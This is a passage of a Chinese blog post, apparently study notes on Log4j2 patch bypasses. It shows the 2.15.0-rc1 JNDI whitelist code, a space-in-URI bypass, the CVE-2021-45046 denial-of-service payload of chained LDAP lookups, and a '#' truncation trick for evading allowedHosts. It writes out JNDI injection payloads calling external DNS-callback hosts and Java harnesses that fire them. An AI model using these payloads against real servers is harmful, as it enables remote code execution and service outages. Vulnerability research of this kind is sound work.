+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> synchronized &lt;T&gt; T lookup(<span class="keyword">final</span> String name) throws NamingException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        URI uri = new URI(name);</span><br><span class="line">        <span class="keyword">if</span> (uri.getScheme() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 允许的协议白名单</span></span><br><span class="line">            <span class="keyword">if</span> (!allowedProtocols.contains(uri.getScheme().toLowerCase(Locale.ROOT))) &#123;</span><br><span class="line">                LOGGER.warn(<span class="string">&quot;Log4j JNDI does not allow protocol &#123;&#125;&quot;</span>, uri.getScheme());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme())) &#123;</span><br><span class="line">                <span class="comment">// 允许的host白名单</span></span><br><span class="line">                <span class="keyword">if</span> (!allowedHosts.contains(uri.getHost())) &#123;</span><br><span class="line">                    LOGGER.warn(<span class="string">&quot;Attempt to access ldap server not in allowed list&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                Attributes attributes = <span class="keyword">this</span>.context.getAttributes(name);</span><br><span class="line">                <span class="keyword">if</span> (attributes != <span class="literal">null</span>) &#123;</span><br><span class="line">                    Map&lt;String, Attribute&gt; attributeMap = new HashMap&lt;&gt;();</span><br><span class="line">                    NamingEnumeration&lt;? extends Attribute&gt; enumeration = attributes.getAll();</span><br><span class="line">                    <span class="keyword">while</span> (enumeration.hasMore()) &#123;</span><br><span class="line">                        Attribute attribute = enumeration.next();</span><br><span class="line">                        attributeMap.put(attribute.getID(), attribute);</span><br><span class="line">                    &#125;</span><br><span class="line">                    Attribute classNameAttr = attributeMap.<span class="keyword">get</span>(CLASS_NAME);</span><br><span class="line">                    <span class="comment">// 参考下图我们这种Payload不存在javaSerializedData头</span></span><br><span class="line">                    <span class="comment">// 所以不会进入类白名单判断</span></span><br><span class="line">                    <span class="keyword">if</span> (attributeMap.<span class="keyword">get</span>(SERIALIZED_DATA) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (classNameAttr != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="comment">// 类名白名单</span></span><br><span class="line">                            String className = classNameAttr.<span class="keyword">get</span>().toString();</span><br><span class="line">                            <span class="keyword">if</span> (!allowedClasses.contains(className)) &#123;</span><br><span class="line">                                LOGGER.warn(<span class="string">&quot;Deserialization of &#123;&#125; is not allowed&quot;</span>, className);</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            LOGGER.warn(<span class="string">&quot;No class name provided for &#123;&#125;&quot;</span>, name);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (attributeMap.<span class="keyword">get</span>(REFERENCE_ADDRESS) != <span class="literal">null</span></span><br><span class="line">                               || attributeMap.<span class="keyword">get</span>(OBJECT_FACTORY) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 不允许REFERENCE这种加载对象的方式</span></span><br><span class="line">                        LOGGER.warn(<span class="string">&quot;Referenceable class is not allowed for &#123;&#125;&quot;</span>, name);</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (URISyntaxException ex) &#123;</span><br><span class="line">        <span class="comment">// This is OK.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (T) <span class="keyword">this</span>.context.lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+所以在协议中间还需要加上空格，payload为`${jndi:ldap:// log4j.o0ovic.dnslog.cn/}`
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Configuration</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultConfigurationBuilder</span>().build(<span class="literal">true</span>); <span class="comment">// 配置开启lookup功能</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">MessagePatternConverter</span> <span class="variable">converter</span> <span class="operator">=</span> MessagePatternConverter.newInstance(config, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;lookups&quot;</span>&#125;);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParameterizedMessage</span>(<span class="string">&quot;$&#123;jndi:ldap:// log4j.o0ovic.dnslog.cn/&#125;&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">LogEvent</span> <span class="variable">event</span> <span class="operator">=</span> Log4jLogEvent.newBuilder()</span><br><span class="line">                .setLoggerName(<span class="string">&quot;MyLogger&quot;</span>)</span><br><span class="line">                .setLevel(Level.DEBUG)</span><br><span class="line">                .setMessage(msg).build();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        converter.format(event, sb);</span><br><span class="line">        System.out.println(sb);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+# 针对 2.15.0 rc2对于 2.15.0 rc1的修复
+
+可以看到在异常中直接`return null`结束了函数的执行
+
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">catch</span> (URISyntaxException ex) &#123;</span><br><span class="line">    LOGGER.warn(<span class="string">&quot;Invalid JNDI URI - &#123;&#125;&quot;</span>, name);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (T) <span class="keyword">this</span>.context.lookup(name);</span><br></pre></td></tr></table></figure>
+
+![image](/yuque-notes/02-Knowledge Book/assets/af2ac2bc-1586953-20220524194131921-1844212249.png)
+
+# log4j2的拒绝服务攻击CVE-2021-45046
+
+参考文章：[https://xz.aliyun.com/t/10670](https://xz.aliyun.com/t/10670)
+
+原理：对于jndi的函数，它是堵塞的，并且一次时间大约为2s，而在Log4j2在处理${}相关的字符串是依次递归解析，也就是说会处理一个字符串中的所有${}并分别处理对应的值，每一次的处理都会造成2秒的等待，所以只需简单的拼接即可，但是对于这个漏洞利用前提是log4j2需要开启lookup
+
+payload：`${jndi:ldap://127.0.0.1}${jndi:ldap://127.0.0.1}${jndi:ldap://127.0.0.1}`
+
+测试代码：
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Configuration</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultConfigurationBuilder</span>().build(<span class="literal">true</span>); <span class="comment">// 配置开启lookup功能</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">MessagePatternConverter</span> <span class="variable">converter</span> <span class="operator">=</span> MessagePatternConverter.newInstance(config, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;lookups&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">// final Message msg = new ParameterizedMessage(&quot;$&#123;jndi:ldap://127.0.0.1/&#125;&quot;);</span></span><br><span class="line">        <span class="comment">// final Message msg = new ParameterizedMessage(&quot;$&#123;jndi:ldap:// log4j.o0ovic.dnslog.cn/&#125;&quot;);</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParameterizedMessage</span>(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1&#125;$&#123;jndi:ldap://127.0.0.1&#125;$&#123;jndi:ldap://127.0.0.1&#125;&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">LogEvent</span> <span class="variable">event</span> <span class="operator">=</span> Log4jLogEvent.newBuilder()</span><br><span class="line">                .setLoggerName(<span class="string">&quot;MyLogger&quot;</span>)</span><br><span class="line">                .setLevel(Level.DEBUG)</span><br><span class="line">                .setMessage(msg).build();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        converter.format(event, sb);</span><br><span class="line">        System.out.println(sb);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+# log4j2的2.15.0版本的RCE
+
+还是之前的那个问题，正常情况下在JndiManager类中的allowedHosts属性是白名单，所以正常来说是无法进行绕过的，而在导致log4j2的2.15.0版本的RCE的出现，原因则是对allowedHosts白名单的绕过，而绕过的原理是通过**域名泛解析**来进行实现绕过的
+
+`if (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme()))`
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">result = &#123;ArrayList@2487&#125;  size = 9</span><br><span class="line"> 0 = &quot;localhost&quot;</span><br><span class="line"> 1 = &quot;127.0.0.1&quot;</span><br><span class="line"> 2 = &quot;ChiLing&quot;</span><br><span class="line"> 3 = &quot;192.168.56.1&quot;</span><br><span class="line"> 4 = &quot;0:0:0:0:0:0:0:1&quot;</span><br><span class="line"> 5 = &quot;192.168.157.1&quot;</span><br><span class="line"> 6 = &quot;172.20.10.2&quot;</span><br><span class="line"> 7 = &quot;fe80:0:0:0:4555:a13b:ca9b:4887%eth11&quot;</span><br><span class="line"> 8 = &quot;192.168.4.1&quot;</span><br></pre></td></tr></table></figure>
+
+![image](/yuque-notes/02-Knowledge Book/assets/ce00e462-1586953-20220524201839595-645795668.png)
+
+第一种尝试是通过@重定向来进行绕过，测试payload：`${jndi:ldap://127.0.0.1@log4j.o0ovic.dnslog.cn/}`
+
+但是可以看到，URI.java的geHost方法最终拿到直接是@后面的字符串，那么后面的字符串中就不存在白名单中字符串了，所以这里是不行的
+
+![image](/yuque-notes/02-Knowledge Book/assets/ca8a8a39-1586953-20220524202617167-1919867502.png)
+
+第二种测试payload：`${jndi:ldap://127.0.0.1#.0wtpsg.ceye.io`，这里的#符号也是存在截断作用的，可以看到这里获取的也是127.0.0.1
+
+![image](/yuque-notes/02-Knowledge Book/assets/16874ab3-1586953-20220528122516264-875491161.png)
+
+我看到别人的文章是可以的，但是我这边的jdk其中有存在对于#符号的判断，如下所示，但是无法进行正常的URL解析，最终抛出MalformedURLException异常
+
+![image](/yuque-notes/02-Knowledge Book/assets/b9f804ec-1586953-20220528123332990-1927906036.png)
+
+这里自己就不继续分析了，主要学习的两个点就是 对于 URI.getHost() 方法的绕过，可以通过 # 来截断后面的非法字符串使得判断成功，而真正的恶意字符串还是存在，最终在ldap请求的时候配合泛解析域名的方法来直接jndi注入造成RCE
+
+---
+
+来源: https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/vv6igknx2wt9ytnx
+语雀文档ID: 183921601
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/09/16/19-wp/" rel="prev" title="wp">
+      <i class="fa fa-chevron-left"></i> wp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/09/16/21-JAVASE/" rel="next" title="JAVASE">
+      JAVASE <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="谷氨酸棒状杆菌"
+      src="https://ice.frostsky.com/2024/03/16/1776051b6463e644bf0eb40aed808727.md.jpeg">
+  <p class="site-author-name" itemprop="name">谷氨酸棒状杆菌</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Glut4micum" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Glut4micum" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">谷氨酸棒状杆菌</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div> -->
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="总访客量 fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="总阅读量 fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
